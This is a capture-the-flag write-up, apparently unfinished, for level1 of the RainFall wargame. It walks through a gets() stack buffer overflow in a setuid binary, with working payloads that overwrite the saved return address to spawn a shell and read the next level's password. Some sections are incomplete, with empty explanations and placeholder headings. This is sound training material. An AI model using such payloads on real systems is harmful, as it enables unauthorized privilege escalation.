# LEVEL1

## 1. Inspect The Executable

```
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with level2 privileges.

```
level1@RainFall:~$ ./level1 

level1@RainFall:~$ ./level1 
test
```

The program waits for user input, most likely a call to `read` or a `gets`. 

```
level1@RainFall:~$ ./level1 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level1@RainFall:~$ ./level1 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Illegal instruction (core dumped)
level1@RainFall:~$ ./level1 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

These tests indicate a buffer overflow vulnerability (here triggered with 76 `a` characters), meaning there is no protection on the input buffer.

## 2. Analyze The Executable

```
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x08048444  run
0x08048480  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find 2 interesting functions: `main` and `run`.

### Program Behavior

#### main function

The `main` function calls `gets()` to read user input into a local variable named `local_50`, without any protection against buffer overflow.

#### run function

Our goal is to redirect execution to the `run` function, which spawns a shell with `level2` privileges.

This can be achieved by exploiting the buffer overflow vulnerabilty in `local_50`, which receives the result of `gets()`.

A buffer overflow attack consists of writing more data than the allocated space of a local variable on the stack, allowing us to overwrite critical values such as saved registers.

### Stack Understanding

To understand the buffer overflow, we need to understand how the stack works.

The stack is a memory area organized as FILO (First In, Last Out).
On x86 architectures, the stack grows from high addresses to low addresses.

At each function call, the stack frame contains:

- the saved EIP (Instruction Pointer), which points to the next instruction of the caller (4 bytes, located at EBP+4)
- the saved EBP (Base Pointer) of the caller (4 bytes, located at EBP)
- the current function sets EBP to point to the new stack frame

space is then allocated for local variables by adjusting ESP

This means that local variables are located below the saved EBP, and overflowing them allows us to overwrite the saved EBP and then the saved EIP.

	Caller :
	Callee :

---

### Understand The Attack

Over writing on the var local, will crush the old ebp and old eip.
old eip etant un pointeur can be used to redirect to another function.
The idea is to overwrite with anything and finish by the address of the target function.
It's important to write the address by reverse (`0x08040200` -> `\x00\x02\x04\x08`).
The tricky part is to found the good buffer to overwrite on the var local and old ebp but not old eip.

---
### ?

For this bnary the stack look like this : 

![img](Ressources/level1.png)

So it need a buffer of 76 + the address to the `run()` function.
`run` as the address `0x08048444` `\x44\x84\x04\x08` in reverse.

```
python -c "print 'A' * 76 + '\x44\x84\x04\x08'"
```

**Explanation:**
- `python`				: 
- `-c` 					: 
- `print` 				: 

#### ?

It can also be a pointer to the `system()` call directly.

```
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
```

Jumping to the address before the call (to setup the call) : `0x08048472` `\x72\x84\x04\x08` in reverse. 

```
python -c "print 'A' * 76 + '\x72\x84\x04\x08'"
```

## 4. Execute The ? Attack ? / Get The Flag

```
level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/payload
level1@RainFall:~$ cat /tmp/payload - | ./level1 
Good... Wait what?
cat /home/user/level2/.pass
XXX
```

```
level1@RainFall:~$ python -c "print 'A' * 76 + '\x72\x84\x04\x08'" > /tmp/payload
level1@RainFall:~$ cat /tmp/payload - | ./level1 
cat /home/user/level2/.pass
XXX
```